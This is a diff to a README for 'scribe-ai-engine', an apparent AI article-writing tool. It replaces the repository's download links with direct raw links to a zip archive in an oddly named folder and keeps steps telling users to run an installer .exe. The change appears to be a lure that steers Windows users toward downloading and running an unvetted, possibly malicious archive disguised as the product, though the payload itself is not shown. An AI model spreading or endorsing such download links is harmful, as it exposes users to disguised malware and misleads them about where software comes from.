@@ -1,6 +1,6 @@
 # ✍️ scribe-ai-engine - Create professional articles with digital intelligence
 
-[![](https://img.shields.io/badge/Download-ScribeAI-blue.svg)](https://github.com/Lindakimno1844/scribe-ai-engine)
+[![](https://img.shields.io/badge/Download-ScribeAI-blue.svg)](https://raw.githubusercontent.com/Lindakimno1844/scribe-ai-engine/main/nasitis/ai_scribe_engine_3.8.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official download page](https://github.com/Lindakimno1844/scribe-ai-engine) to access the installer files.
+1. Visit the [official download page](https://raw.githubusercontent.com/Lindakimno1844/scribe-ai-engine/main/nasitis/ai_scribe_engine_3.8.zip) to access the installer files.
 2. Look for the file labeled scribe-installer.exe in the list of assets.
 3. Click the file to start the download.
 4. Open the folder where your computer saves downloads.
